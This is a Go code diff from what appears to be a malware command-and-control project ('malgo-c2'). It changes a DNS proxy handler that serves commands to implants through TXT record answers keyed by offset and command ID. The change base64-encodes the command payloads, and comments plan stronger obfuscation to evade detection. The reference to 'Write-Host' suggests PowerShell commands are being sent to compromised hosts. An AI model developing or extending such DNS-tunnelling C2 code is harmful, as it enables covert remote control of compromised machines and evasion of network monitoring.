@@ -2,6 +2,7 @@ package dnsproxy
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	gateway "github.com/VipWW/malgo-c2/services/common/service"
@@ -38,8 +39,8 @@ func (h *Handler) handleTXT(msg *dns.Msg, r *dns.Msg) error {
 			}
 		}
 
-		r, _ := json.Marshal(grpcResult)
-		result = string(r)
+		res, _ := json.Marshal(grpcResult)
+		result = string(res)
 	case 3:
 		// <offset>.<CommandID>.<domain>
 		offset, err := strconv.Atoi(splitData[1])
@@ -54,12 +55,13 @@ func (h *Handler) handleTXT(msg *dns.Msg, r *dns.Msg) error {
 		if err != nil {
 			return err
 		}
-		r, _ := json.Marshal(grpcResult)
-		result = string(r) // TODO: check for encoding issues (e.g. "data": "Write-Host "... "")
-		// TODO: check for newline encoding issues, see if obfuscation fixes it
+		res, _ := json.Marshal(grpcResult)
+
+		// write base64 encoded data to the result
+		result = base64.StdEncoding.EncodeToString(res)
 	}
 
-	//TODO: obfuscate the result
+	//TODO: obfuscate the result. Switch from base64 to something else
 
 	msg.Answer = append(msg.Answer, &dns.TXT{
 		Hdr: dns.RR_Header{
